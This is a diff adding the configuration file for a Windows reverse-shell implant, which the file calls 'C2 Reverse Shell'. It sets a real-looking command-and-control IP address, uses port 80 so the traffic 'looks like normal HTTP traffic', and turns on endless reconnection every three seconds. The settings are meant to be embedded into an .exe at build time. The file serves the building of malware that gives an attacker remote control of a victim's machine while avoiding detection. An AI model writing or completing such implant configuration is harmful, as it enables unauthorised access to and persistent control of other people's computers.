@@ -1,0 +1,19 @@
+# C2 Reverse Shell Configuration
+# ================================
+# Edit this file before building to set your C2 server IP
+# This file will be embedded into the .exe during build
+#
+# Format: KEY=VALUE (no spaces around =)
+
+# C2 Server IP Address (REQUIRED - change this!)
+C2_HOST=147.185.133.114
+
+# C2 Server Port (default: 80 - looks like normal HTTP traffic)
+C2_PORT=80
+
+# Persistent mode - keep trying to reconnect forever
+# true = infinite reconnect, false = exit after failed connection
+PERSISTENT=true
+
+# Retry interval in seconds (time between reconnection attempts)
+RETRY_INTERVAL=3
